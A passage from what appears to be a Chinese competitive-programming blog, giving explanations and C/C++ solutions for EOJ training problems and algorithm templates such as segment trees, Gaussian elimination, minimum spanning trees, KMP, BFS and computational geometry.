存起来。然后对合数的 $i^k$ 只要用素数的结果求就可以了。\n#include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll; const int p = 19260817; const int maxn = 1e7+5; bool flag[maxn]; ll f[maxn], prime[maxn], n, k, cnt; inline ll pow_mod(ll a, ll b) { ll res = 1; while (b) { if (b \u0026amp; 1) res = res * a % p; a = a * a % p; b \u0026gt;\u0026gt;= 1; } return res; } inline void sieve() { for (int i = 2; i \u0026lt;= n; ++i) { if (!flag[i]) { prime[cnt++] = i; f[i] = pow_mod(i, k); } for (int j = 0; j \u0026lt; cnt \u0026amp;\u0026amp; i * prime[j] \u0026lt;= n; ++j) { flag[i * prime[j]] = 1; f[i * prime[j]] = f[i] * f[prime[j]] % p; if (i % prime[j] == 0) break; } } } int main() { scanf(\u0026#34;%lld%lld\u0026#34;, \u0026amp;n, \u0026amp;k); ll sum = 1; sieve(); for (ll i = 2; i \u0026lt;= n; ++i) sum = (sum + f[i]) % p; printf(\u0026#34;%lld\\n\u0026#34;, sum); return 0; } B # 给出一个长度为 N 的整数数列 A，对于这个数列进行任意多操作。每次选择一个任意的整数，并将任意 P 个数字加上这个数字。输出 YES 或 NO，表示能否通过这种方法将这个数列中每个数字同时变成零。 1 ≤ P ≤ N ≤ 1e5, |Ai| \u0026lt;= 1e6\n结论题。显然当 n==p 时只有所有数字相等时才是 YES；n\u0026gt;p 时，数字总和如果是 p 的倍数则 YES。其实凭感觉可以想到：要把所有数字变成 0，和必须是 p 的倍数。不过严格的证明则是将所有 n\u0026gt;p 的情况转化为 n==p+1 的情况。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int n, p, i, tmp, sum; int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; p; if (n == p) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;tmp); for (i = 1; i \u0026lt; n; ++i) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;sum); if (sum != tmp) break; } printf(\u0026#34;%s\\n\u0026#34;, i == n ? \u0026#34;YES\u0026#34; : \u0026#34;NO\u0026#34;); }else { for (i = 0; i \u0026lt; n; ++i) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;tmp); sum += tmp; } printf(\u0026#34;%s\\n\u0026#34;, sum % p ? \u0026#34;NO\u0026#34; : \u0026#34;YES\u0026#34;); } return 0; } C # 给任意一个大于 1 的正整数 N, 输出 N 可以分解成最少几个质数 (可以相同) 的和。 2 ≤ N ≤ 1e15\n据说是 Codeforces 原题。 如果本身是质数那么直接输出 1。 运用哥德巴赫猜想，任何大于 2 的偶数可以被分解为两个质数之和。也就是偶数输出 2。 如果 n 是奇合数但还可以被分解为两个质数，那只可能是一奇一偶。偶质数只能是 2，也就是说 n-2 必须是质数。 其他情况输出 3。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll; ll n; inline bool isprime(ll m) { for (ll i = 2; i * i \u0026lt;= m; ++i) if (!(m % i)) return 0; return 1; } int main() { cin \u0026gt;\u0026gt; n; if (n == 2) printf(\u0026#34;1\\n\u0026#34;); else if (!(n\u0026amp;1)) printf(\u0026#34;2\\n\u0026#34;); else if (isprime(n)) printf(\u0026#34;1\\n\u0026#34;); else if (isprime(n-2)) printf(\u0026#34;2\\n\u0026#34;); else printf(\u0026#34;3\\n\u0026#34;); return 0; } D # 给出 n 个正整数，问有多少种方法在这 n 个数字的中取其中一些数字，使得这些数字之和超过 k。若答案超过 20 000 000，输出 -1。 1 ≤ n ≤ 1e4 1 ≤ ai ≤ 1e8 1 ≤ k ≤ 1e10\n降序排序，预处理前缀和，然后 dfs + 剪枝。 最优性剪枝：如果当前和已经大于 k 则剪枝，ans 要加上 2^(剩余数字个数)——这一步还可以剪枝：由于 2^25\u0026gt;2e7，所以一旦剩余数字个数大于等于 25 也剪枝。 可行性剪枝：如果当前和加上后面所有数（用前缀和）都不大于 k 那么剪枝。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll; const int maxn = 1e4+5; int a[maxn], n, ans; bool flag; ll k, suma[maxn]; inline void dfs(int dep, ll sum) { if (flag || sum + suma[n]-suma[dep-1] \u0026lt;= k) return; if (sum\u0026gt; k) { n-dep+1 \u0026gt;= 25 ? flag = 1 : ans += 1\u0026lt;\u0026lt;(n-dep+1); return; } dfs(dep+1, sum + a[dep]); dfs(dep+1, sum); } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; k; for (int i = 1; i \u0026lt;= n; ++i) scanf(\u0026#34;%d\u0026#34;, a+i); sort(a+1, a+1+n, greater\u0026lt;int\u0026gt;()); for (int i = 1; i \u0026lt;= n; ++i) suma[i] = suma[i-1] + a[i]; dfs(1, 0); printf(\u0026#34;%d\\n\u0026#34;, flag ? -1 : ans); return 0; } E # 给出整数数列 ${an}$，对整个数列进行尽可能少的次数操作，每次操作可以将数列中任意一项加 1 或者减 1，使得最终的数列 $b_1,b_2,b_3,…,b_n$ 满足对数列中的任一项 $b_i(i\u0026gt;=2)$，有 $b_i=b_{i−1}+i$。 求最少的操作次数。1 ≤ n ≤ 1e5，1 ≤ $a_i$ ≤ 1e10\n设 ${c_n}={a_1,a_2-2,a_3-5,a_4-9\u0026hellip;}$，这题等价于求 $|c_1-x|+|c_2-x|+\u0026hellip;+|c_n-x|$ 的最小值。根据高中函数知识，$x$ 应该取 ${c_n}$ 的中位数。那么我们构造出 ${c_n}$ 然后排下序取中间下标，这题就做完了……\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll; const int maxn = 1e5+5; ll a[maxn], b[maxn], ans; int n; inline ll fun(ll mid) { ll ret = 0; for (int i = 1; i \u0026lt;= n; ++i) ret += abs(mid - a[i]); return ret; } int main() { cin \u0026gt;\u0026gt; n; b[2] = 2; for (int i = 3; i \u0026lt;= n; ++i) b[i] = b[i-1] + i; for (int i = 1; i \u0026lt;= n; ++i) { scanf(\u0026#34;%lld\u0026#34;, a+i); a[i] -= b[i]; } sort(a+1, a+1+n); printf(\u0026#34;%lld\\n\u0026#34;, fun(a[(n+1)\u0026gt;\u0026gt;1])); return 0; } F # 对于给定的数字串 $a_1,a_2,a_3,…,a_n$，每次可以进行如下操作: 选择一个数 i (1 \u0026lt; i \u0026lt; n)，将 $a_i$ 变成 $a_{i+1}+a_{i−1}−a_i$。问在经过任意多次的操作后，该数列的数字总和最小为多少？ 1 ≤ n ≤ 1e5，0 ≤ $a_i$ ≤ 1e10\n令 $c_i=a_{i+1}-a_i$，这样 c 数列有 n-1 项。注意到对 $a_i$ 的操作等价于交换 $c_i$ 与 $c_{i+1}$，那么通过将 c 升序排序后反构造出的 a 数列就是总和最小的数列啦。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll; const int maxn = 1e5+5; ll a[maxn], c[maxn], sum; int main() { int n; cin \u0026gt;\u0026gt; n; for (int i = 0; i \u0026lt; n; ++i) scanf(\u0026#34;%lld\u0026#34;, a+i); for (int i = 0; i \u0026lt; n-1; ++i) c[i] = a[i+1] - a[i]; sort(c, c + n-1); sum = a[0]; for (int i = 1; i \u0026lt; n; ++i) { a[i] = a[i-1] + c[i-1]; sum += a[i]; } printf(\u0026#34;%lld\\n\u0026#34;, sum); return 0; } Week 3 # D # n 个椅子，c 种颜色排成一圈，间隔 1m。随机选一种颜色，你要马上移动到这种颜色的椅子上（原本颜色相同则不动）。求走动距离的最小期望（输出最简分数）。 1 ≤ c ≤ n ≤ 1e6\n据说暴力模拟 + 优化（$O(n^2)\\rightarrow O(nlogn)$？）2.5s 内可过…… 不过这里用了一些数学知识，复杂度降到 $O(n)$。 首先肯定是常规的环拆链操作：复制一份放到后面去。这样就可以规定正方向为向右，从左往右扫描了。 要求出答案，关键在于求出要坐的这个位置。要求出这个位置，无疑需要求出位置 i 到各个颜色椅子的最短期望距离和 $d(i)$。 设 $D(i,k)$ 为椅子 i 到颜色为 k 的椅子的最短期望距离。即：$$d(i)=\\sum_{k=1}^cD(i,k)$$ 我们发现，对每一个 k，$D(i,k)$ 是一个关于 i 的分段函数：\ni 在距离最近的颜色为 k 的椅子左边，则 i 每右移一次，离该椅子的距离 - 1，此时 $D\u0026rsquo;(i,k)=-1$； 同理，i 在距离最近的颜色为 k 的椅子右边，则 i 每右移一次，离该椅子的距离 + 1，此时 $D\u0026rsquo;(i,k)=+1$； 于是在中间某个时刻，我们移动到了这张椅子上，此时 $D\u0026rsquo;(i,k)=0$，这里是函数的驻点。再求（伪）二阶导，由于一阶导在这个点从 -1 变成了 + 1，我们可以认为（伪）二阶导 $D\u0026rsquo;\u0026rsquo;(i,k)=+2$。（这样设定二阶导是为了方便后面求一阶导和答案） 再考虑两个相邻的同色（k）椅子：当经过两者中点前，我们离左边椅子的距离小于离右边椅子的距离，反之亦然。也就是说，在经过两者中点时，$D\u0026rsquo;(i,k)$ 由 + 1 变为了 - 1（中间的椅子数为奇时，会在中点处变为 0）。 因此，需要对 $\\text{ceil}((i+j)/2)$ 和 $\\text{floor}((i+j)/2)$ 这两个点（中间的椅子数为奇时，一个点）的二阶导分别减 1。\n综上，二阶导处理完毕。对二阶导求前缀和并且每项减 c，得到一阶导。再对一阶导求前缀和（注意特判，第 0 个位置就是 -c），得到每个位置的 $d(i)$，最后取最小值，这题就终于做完了……\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long long ll; const int maxn = 2e6+5; int n, c, a[maxn], nxt[maxn]; ll d[maxn]; ll gcd(ll a, ll b) { return b ? gcd(b, a%b) : a; } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; c; for (int i = 1; i \u0026lt;= n; ++i) scanf(\u0026#34;%d\u0026#34;, a+i); for (int i = n+1; i \u0026lt;= (n\u0026lt;\u0026lt;1); ++i) a[i] = a[i-n]; n \u0026lt;\u0026lt;= 1; for (int i = n; i\u0026gt;= 1; --i) { d[i] += 2; int \u0026amp;j = nxt[a[i]]; if (j) { d[(i+j)\u0026gt;\u0026gt;1] -= 1; d[(i+j+1)\u0026gt;\u0026gt;1] -= 1; } j = i; } for (int i = 1; i \u0026lt;= n; ++i) d[i] += d[i-1]; d[0] = -c; for (int i = 1; i \u0026lt;= n; ++i) d[i] += -c; ll sum = 0; for (int i = 1; i \u0026lt;= n; ++i) { int \u0026amp;j = nxt[a[i]]; if (j) { sum += i; j = 0; } } ll ans = (ll)n * n; for (int i = 1; i \u0026lt;= n; ++i) { sum += d[i-1]; if (sum \u0026lt; ans) ans = sum; } ll g = gcd(ans, c); ans /= g; c /= g; printf(\u0026#34;%lld/%d\\n\u0026#34;, ans, c); } E # EOJ 的登录系统爆出了一个重大问题，当正确的密码是你输入的密码的子串时，就可以成功登录！ 例如你的密码是 abc，则你输入 abcc，aabc，甚至 dfjklsdfabcsdjfkl，都可以成功登录！ 出现了这么大的问题，那就一定要有人来背锅，管理员们希望在背锅之前先衡量一下锅的大小。 现在有一份 EOJ 用户的密码表，里面包含了 n 个用户的密码，第 i 个用户的密码是 pwdi。我们定义锅的大小为所有有序对 (i,j) (i≠j) 的数量，使得用户 i 能够输入他的密码 pwdi 成功登陆用户 j 的账户。 换句话说，我们现在需要知道，有多少有序对 (i,j) (i≠j) 使得 pwdj 是 pwdi 的子串。 第 1 行包含一个整数 n，1≤n≤20 000，表示密码表中密码的数量。 第 1+i (1≤i≤n) 行包含一个长度不超过 10 且由小写字母组成的字符串，表示 pwdi。\n因为长度太短了，所以可以直接枚举子串（每个密码最多 55 个子串），hash 一下存进 map 里统计子串的出现次数。然后对于每个密码，计算其在子串中出现的次数。记得要减去 n，因为每个密码也一定是自己的子串。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 20005; typedef long long ll; ll SS[maxn]; set\u0026lt;ll\u0026gt; S[maxn]; map\u0026lt;ll, int\u0026gt; m; char s[15]; int n, ans, len; int main() { cin \u0026gt;\u0026gt; n; for (int i = 0; i \u0026lt; n; ++i) { scanf(\u0026#34;%s\u0026#34;, s); len = strlen(s); for (int j = 0; j \u0026lt; len; ++j) { ll h = 0; for (int k = j; k \u0026lt; len; ++k) { h = h * 29 + s[k]-\u0026#39;a\u0026#39;+1; S[i].insert(h); if (!j \u0026amp;\u0026amp; k+1 == len) SS[i] = h; } } for (auto x: S[i]) ++m[x]; } for (int i = 0; i \u0026lt; n; ++i) ans += m[SS[i]]; printf(\u0026#34;%d\\n\u0026#34;, ans-n); return 0; } Week 4 # D # 有一个数列 $A_n$，其中 $A_1=1,A_2=2,A_{n+2}=A_{n+1}+A_n$。 给你一个数字，问他是这个数列的第几项。 每行包括数列中的一项 $A_k$ (k≤100000)。 总行数 T≤100。\n看到标题以为是很水的题…… 实际上，斐波那契数列的 100000 项是一个超出 long long 范围的数，因此一开始考虑用高精度。后来发现数据加强了，时限和内存又比较紧 (卡掉了我的 python 预处理算法 \u0026amp;\u0026amp; python 滚动暴力算法 \u0026amp;\u0026amp; C++ 高精度 + 二分查找算法)，只能使用一些技巧。 类似 hash，用一个大质数（比如 19260817）将斐波那契数列的各项 hash 掉，再利用同余定理查找答案，就做完了……？\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 1e5+5; const int p = 19260817; int now, f[maxn]; map\u0026lt;int, int\u0026gt; m; string s; int main() { f[0] = f[1] = 1; m[1] = 1; for (int i = 2; i \u0026lt; maxn; ++i) { f[i] = (f[i-1] + f[i-2]) % p; m[f[i]] = i; } while (cin\u0026gt;\u0026gt; s) { now = 0; for (auto \u0026amp;i: s) now = (now*10 + i-\u0026#39;0\u0026#39;) % p; printf(\u0026#34;%d\\n\u0026#34;, m[now]); } return 0; } ","date":"2018-02-13","permalink":"/posts/eoj-training/","section":"Posts","summary":"\u003cp\u003e记录了新生训练上遇到的一些奇怪题，主要是 Week2 遇到的。\u003c/p\u003e","title":"EOJ 新生训练"},{"content":"全是不太熟的模板。\n线段树 (EOJ 2525) # 有 n 个灯，m 次操作，0 表示一段区间内灯的状态全部反转，1 表示询问一段区间内亮着的灯的数量。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 1e5+5; int st[maxn\u0026lt;\u0026lt;2], add[maxn\u0026lt;\u0026lt;2], n, m, flag, s, e; void pushdown(int rt, int l, int r) { int mid = (l+r) \u0026gt;\u0026gt; 1; st[rt\u0026lt;\u0026lt;1] = mid-l+1 - st[rt\u0026lt;\u0026lt;1]; st[rt\u0026lt;\u0026lt;1|1] = r-mid - st[rt\u0026lt;\u0026lt;1|1]; add[rt\u0026lt;\u0026lt;1] ^= add[rt]; add[rt\u0026lt;\u0026lt;1|1] ^= add[rt]; add[rt] = 0; } void update(int rt, int s, int e, int l, int r) { if (s \u0026lt;= l \u0026amp;\u0026amp; r \u0026lt;= e) { st[rt] = r-l+1 - st[rt]; add[rt] ^= 1; return; } int mid = (l+r) \u0026gt;\u0026gt; 1; if (add[rt]) pushdown(rt, l, r); if (s \u0026lt;= mid) update(rt\u0026lt;\u0026lt;1, s, e, l, mid); if (e\u0026gt; mid) update(rt\u0026lt;\u0026lt;1|1, s, e, mid+1, r); st[rt] = st[rt\u0026lt;\u0026lt;1] + st[rt\u0026lt;\u0026lt;1|1]; } int query(int rt, int s, int e, int l, int r) { if (s \u0026lt;= l \u0026amp;\u0026amp; r \u0026lt;= e) return st[rt]; int ans = 0, mid = (l+r) \u0026gt;\u0026gt; 1; if (add[rt]) pushdown(rt, l, r); if (s \u0026lt;= mid) ans += query(rt\u0026lt;\u0026lt;1, s, e, l, mid); if (e\u0026gt; mid) ans += query(rt\u0026lt;\u0026lt;1|1, s, e, mid+1, r); return ans; } int main() { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m); for (int i = 0; i \u0026lt; m; ++i) { scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;flag, \u0026amp;s, \u0026amp;e); if (flag) printf(\u0026#34;%d\\n\u0026#34;, query(1, s, e, 1, n)); else update(1, s, e, 1, n); } return 0; } 最大连续子序列的和 # 由于要让和最大，可以直接屏蔽掉和为负数的情况 (tot \u0026lt; 0)，但是由于求的是连续子序列的和，不能一遇到负数的项就扔掉。如：5 6 -1 5 4 -7，最大连续子序列和为 6+(-1)+5+4=14。 然后用 tot 更新 ans 就行了。\n#include \u0026lt;stdio.h\u0026gt; int main() { int cas, i, n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;cas); while (cas--){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); int a[100] = {0}; for (i = 0; i \u0026lt; n; ++i) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i]); int ans = a[0], tot = 0; for (i = 0; i \u0026lt; n; ++i){ if (tot\u0026gt; 0) tot += a[i]; else tot = a[i]; if (tot\u0026gt; ans) ans = tot; } printf(\u0026#34;%d\\n\u0026#34;, ans); } return 0; } 高斯消元求行列式及逆矩阵 # 给定一个 n*n 的矩阵，输出它的行列式值和逆矩阵（保证存在）。\n期末复习线性代数时，发现自己求逆矩阵总是求错，于是干脆写了个程序来实现。。 高斯消元法求解线性方程组只要稍微修改下代码就可以，判断无解 / 无穷多解也不难，至于求自由未知量然后输出任意一解…… 还没有想好。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const double eps = 1e-6; const int N = 12; void gauss(double a[][N], double b[], double x[], int n) { int i; double s; for (int k = 1; k \u0026lt;= n; ++k) { for (i = k; i \u0026lt;= n \u0026amp;\u0026amp; fabs(a[i][k]) \u0026lt;eps; ++i); if (i != k) { for (int j = k; j \u0026lt;= n; ++j) swap(a[i][j], a[k][j]); swap(b[i], b[k]); } for (i = k+1; i \u0026lt;= n; ++i) { s = a[i][k] / a[k][k]; for (int j = k; j \u0026lt;= n; ++j) a[i][j] -= a[k][j] * s; b[i] -= b[k] * s; } } for (i = n; i\u0026gt;= 1; --i) { s = b[i]; for (int j = i+1; j \u0026lt;= n; ++j) s -= x[j] *a[i][j]; x[i] = s / a[i][i]; if (fabs(x[i]) \u0026lt;eps) x[i] = 0; } } int main() { double a[N][N], b[N], x[N], mt[N][N], mk[N][N]; int n; cin \u0026gt;\u0026gt; n; for (int i = 1; i \u0026lt;= n; ++i) { for (int j = 1; j \u0026lt;= n; ++j) { cin \u0026gt;\u0026gt; mk[i][j]; a[i][j] = mk[i][j]; } b[i] = 0; } gauss(a, b, x, n); double det = 1; for (int i = 1; i \u0026lt;= n; ++i) det *= a[i][i]; if (fabs(det) \u0026lt;eps) det = 0; printf(\u0026#34;%0.2f\\n\u0026#34;, det); for (int k = 1; k \u0026lt;= n; ++k) { for (int i = 1; i \u0026lt;= n; ++i) { for (int j = 1; j \u0026lt;= n; ++j) a[i][j] = mk[i][j]; b[i] = 0; } b[k] = 1; gauss(a, b, x, n); for (int i = 1; i \u0026lt;= n; ++i) mt[i][k] = x[i]; } for (int i = 1; i \u0026lt;= n; ++i) { for (int j = 1; j \u0026lt; n; ++j) printf(\u0026#34;%0.2f\u0026#34;, mt[i][j]); printf(\u0026#34;%0.2f\\n\u0026#34;, mt[i][n]); } return 0; } 计算两个一元多项式的乘积 # 算是高精度乘法？ 细节比较多。降幂输出非零系数。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #define N 100 void readpoly(char *s, int* poly) { while (*s){ int sign = 1, a = 0, i = 0; if (*s ==\u0026#39;+\u0026#39;) ++s; else if (*s ==\u0026#39;-\u0026#39;) sign = -1, ++s; while (isdigit(*s)){ a = a * 10 + *s -\u0026#39;0\u0026#39;; ++s; } if (a == 0) a = 1; if (*s !=\u0026#39;x\u0026#39;) {poly[0] = a * sign; return;} else ++s; if (*s ==\u0026#39;^\u0026#39;) ++s; while (isdigit(*s)) { i = i * 10 + *s - \u0026#39;0\u0026#39;; ++s; } if (i == 0) i = 1; poly[i] = a * sign; } } void multiply(char *s1,char *s2, int* poly) { int poly1[N] = {0}, poly2[N] = {0}, i, j; readpoly(s1, poly1); readpoly(s2, poly2); for (i = 0; i \u0026lt; N / 2; ++i) for (j = 0; j \u0026lt; N / 2; ++j) poly[i + j] += poly1[i] * poly2[j]; } int main() { char s1[N+1], s2[N+1]; while(scanf(\u0026#34;%s%s\u0026#34;, s1, s2) != EOF){ int poly[N] = {0}, out[N], n = 0, i; multiply(s1, s2, poly); for (i = 0; i \u0026lt; N; ++i) if (poly[i]) out[n++] = poly[i]; for (i = n - 1; i\u0026gt;= 0; --i){ printf(\u0026#34;%d\u0026#34;, out[i]); i ? printf(\u0026#34;\u0026#34;) : printf(\u0026#34;\\n\u0026#34;); } } return 0; } Prim(EOJ 3199) # #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 105; const int INF = 0x3f3f3f3f; int mp[maxn][maxn], dis[maxn], vis[maxn], n, sum; inline int prim() { memset(vis, 0, sizeof vis); memset(dis, INF, sizeof dis); sum = dis[1] = 0; for (;;) { int u = -1, v, mincost = INF; for (int i = 1; i \u0026lt;= n; ++i) if (dis[i] \u0026lt;mincost \u0026amp;\u0026amp; !vis[i]) { mincost = dis[i]; u = i; } if (u == -1) break; vis[u] = 1; sum += dis[u]; for (v = 1; v \u0026lt;= n; ++v) if (dis[v] \u0026gt; mp[u][v]) dis[v] = mp[u][v]; } return sum; } int main() { while (cin\u0026gt;\u0026gt; n) { memset(mp, INF, sizeof mp); for (int i = 1; i \u0026lt;= n; ++i) for (int j = 1; j \u0026lt;= n; ++j) scanf(\u0026#34;%d\u0026#34;, \u0026amp;mp[i][j]); printf(\u0026#34;%d\\n\u0026#34;, prim()); } return 0; } Kruskal(EOJ 3201) # n 个点，m 条边的图，要使得图中没有圈，求要去掉的边的权值和的最小值。\n求图的最大生成树，用总权值减生成树权值得到答案。似乎是只能用 Kruskal 做。边数组应该是要开到 10000 * 10000 / 2 的，没想到 EOJ 上提交 RTE，改成 10000 * 100 就好了……\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define maxn 11000 struct edge { int u, v; double w; }g[maxn*100]; struct node { double x, y; }point[maxn]; double sum; int n, m, fa[maxn]; inline double dis(const node\u0026amp; a, const node\u0026amp; b) { return sqrt((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y)); } bool cmp(const edge\u0026amp; a, const edge\u0026amp; b) { return a.w \u0026gt; b.w; } inline int find(int x) { return x == fa[x] ? x : fa[x] = find(fa[x]); } inline double kruskal() { sort(g, g+m, cmp); double remain = 0.0; for (int i = 0; i \u0026lt; m; ++i) { int x = find(g[i].u), y = find(g[i].v); if (x != y) { fa[x] = y; remain += g[i].w; }else continue; } return sum - remain; } int main() { int u, v; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 1; i \u0026lt;= n; ++i) fa[i] = i; for (int i = 1; i \u0026lt;= n; ++i) scanf(\u0026#34;%lf%lf\u0026#34;, \u0026amp;point[i].x, \u0026amp;point[i].y); for (int i = 0; i \u0026lt; m; ++i) { scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;u, \u0026amp;v); g[i].u = u; g[i].v = v; g[i].w = dis(point[u], point[v]); sum += g[i].w; } printf(\u0026#34;%.6f\\n\u0026#34;, kruskal()); return 0; } KMP # 对于一个给定的字符串 s，唐纳德给出 q 次询问，第 i 次询问包括三个参数 li,ri,zi，问在 s[li…ri] 的所有子串中共有多少个恰好为 zi。 1≤|s|≤100, q≤∑|zi|≤100\n坑点在于可重复。。比赛时用 Python 的切片水过去了，后来发现 C++ 用 string 的 substr 和 find 方法也不难写，这里仅记录一下刚学的 KMP 解法。\n说实话，KMP 初学起来是有些绕，不过找点例子，耐心画几个图很快就能理解了。这个算法比较有趣的是求 next 数组时也是用的 KMP，有种自洽的感觉。据说实际上，库函数 strstr 和 KMP 效率差不多（甚至更快？）。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 1005; char s[maxn], t[maxn]; int nxt[maxn]; int q, l, r, len; inline void getnext() { nxt[0] = -1; for (int i = 1, j = -1; i \u0026lt; len; ++i) { while (j\u0026gt; -1 \u0026amp;\u0026amp; t[j+1] != t[i]) j = nxt[j]; if (t[j+1] == t[i]) ++j; nxt[i] = j; } } inline int kmp() { getnext(); int ans = 0; for (int i = l, j = -1; i \u0026lt;= r; ++i) { while (j\u0026gt; -1 \u0026amp;\u0026amp; t[j+1] != s[i]) j = nxt[j]; if (t[j+1] == s[i]) ++j; if (j == len-1) ++ans; } return ans; } int main() { scanf(\u0026#34;%s%d\u0026#34;, s, \u0026amp;q); while (q--) { scanf(\u0026#34;%d%d %s\u0026#34;, \u0026amp;l, \u0026amp;r, t); len = strlen(t); printf(\u0026#34;%d\\n\u0026#34;, kmp()); } return 0; } 带路径还原的 BFS # 给定一个迷宫和起点终点，求最快要多少步到终点以及最快的路径，不能到达输出 -1。\n显然 bfs，也因此需要开一个 step 数组记录步数，更新没有走过的点的 step。路径还原则又需要一个数组记录这一步的上一个点，还原时从后往前递归输出即可。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 205; int n, m, sx, sy, ex, ey, ans; char mp[maxn][maxn]; int step[maxn][maxn]; const int dx[] = {1,-1,0,0}; const int dy[] = {0,0,1,-1}; struct node { int x, y; }a[maxn][maxn]; inline bool in(int x, int y) { return x\u0026gt;=0 \u0026amp;\u0026amp; x\u0026lt;n \u0026amp;\u0026amp; y\u0026gt;=0 \u0026amp;\u0026amp; y\u0026lt;n; } inline void bfs() { queue\u0026lt;node\u0026gt; q; node u, v; int now = 0; u.x = sx; u.y = sy; q.push(u); while (!q.empty()) { u = q.front(); q.pop(); now = step[u.x][u.y]; for (int i = 0; i \u0026lt; 4; ++i) { v.x = u.x+dx[i]; v.y = u.y+dy[i]; if (in(v.x, v.y) \u0026amp;\u0026amp; mp[v.x][v.y]==\u0026#39;.\u0026#39; || mp[v.x][v.y] == \u0026#39;E\u0026#39;) if (!step[v.x][v.y]) { a[v.x][v.y].x = u.x; a[v.x][v.y].y = u.y; step[v.x][v.y] = now+1; if (mp[v.x][v.y] == \u0026#39;E\u0026#39;) { ans = step[v.x][v.y]; return; } q.push(v); } } } } inline void dfs(int x, int y) { if (x!=sx || y!=sy) dfs(a[x][y].x, a[x][y].y); printf(\u0026#34;%d %d\\n\u0026#34;, x, y); } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; cin.get(); for (int i = 0; i \u0026lt; n; ++i) { scanf(\u0026#34;%s\u0026#34;, mp[i]); for (int j = 0; j \u0026lt; m; ++j) if (mp[i][j] == \u0026#39;S\u0026#39;) { sx = i; sy = j; }else if(mp[i][j] == \u0026#39;E\u0026#39;) { ex = i; ey = j; } } memset(step, 0, sizeof step); bfs(); if (ans) { printf(\u0026#34;%d\\n\u0026#34;, ans); dfs(ex, ey); }else printf(\u0026#34;-1\\n\u0026#34;); return 0; } 判断两条线段是否相交 # 包括了一个或多个点重合的情况。 输入点的坐标顺序为 Ax,Ay,Bx,By,Cx,Cy,Dx,Dy，判断线段 AB 与线段 CD 是否相交。 由于问题比较简单，没有用到向量、叉积什么的，而是用了奇怪的作图法 + 不证明直接推广法（？）。 可以画个图验证一下。对于稍难的计算几何题，这些奇技淫巧就没有用了。\n#include \u0026lt;stdio.h\u0026gt; int main() { int x1, y1, x2, y2, x3, y3, x4, y4; while (~scanf(\u0026#34;%d%d%d%d%d%d%d%d\u0026#34;, \u0026amp;x1, \u0026amp;y1, \u0026amp;x2, \u0026amp;y2, \u0026amp;x3, \u0026amp;y3, \u0026amp;x4, \u0026amp;y4)){ double k = 1.0 * (y1 - y2) / (x1 - x2); double n = y1 - k * x1; double ans1 = k * x3 + n, ans2 = k * x4 + n; if ((ans1 \u0026lt;= y3 \u0026amp;\u0026amp; ans2\u0026gt;= y4) || (ans1\u0026gt;= y3 \u0026amp;\u0026amp; ans2 \u0026lt;= y4)) printf(\u0026#34;Yes\\n\u0026#34;); else printf(\u0026#34;No\\n\u0026#34;); } return 0; } 计算多边形面积 # 我们假定得到了按照逆时针顺序给出的 n 个顶点的坐标 x1, y1, x2, y2 ... xn, yn 且坐标均为整数。 那么最简洁的方法就是计算向量叉积（其实也是算行列式）来求，对凹多边形也适用。直观的理解是将多边形分为了若干个小三角形分别求面积。\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cmath\u0026gt; using namespace std; int main(void) { int n, i, x[101], y[101]; double sum; while(cin\u0026gt;\u0026gt; n \u0026amp;\u0026amp; n){ for (i = 0; i \u0026lt; n; ++i) cin \u0026gt;\u0026gt; x[i] \u0026gt;\u0026gt; y[i]; sum = 0; for (i = 0; i \u0026lt; n - 1; ++i) sum += (x[i] * y[i + 1] - x[i + 1] * y[i]); sum = (fabs(sum + x[i] * y[0] - x[0] * y[i])) * 1.0 / 2; printf(\u0026#34;%.1f\\n\u0026#34;, sum); } } 判断线段是否与矩形相交 # 输入格式： xstart ystart xend yend xleft ytop xright ybottom Note: The terms top left and bottom right do not imply any ordering of coordinates.\n计算几何题对我来说，光是写对就要花很久，而代码还要做到既简洁又易懂真是难上加难…… 注意点在于：线段与矩形不相交，这意味着线段不仅可以在矩形外，还可以在矩形内。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main() { int t, x1, y1, x2, y2, xl, yt, xr, yb; int a, b, c, f1, f2, f3, f4; cin \u0026gt;\u0026gt; t; while (t--) { scanf(\u0026#34;%d%d%d%d%d%d%d%d\u0026#34;, \u0026amp;x1, \u0026amp;y1, \u0026amp;x2, \u0026amp;y2, \u0026amp;xl, \u0026amp;yt, \u0026amp;xr, \u0026amp;yb); if (xl\u0026gt; xr) swap(xl, xr); if (yt \u0026lt; yb) swap(yt, yb); a = y1 - y2; b = 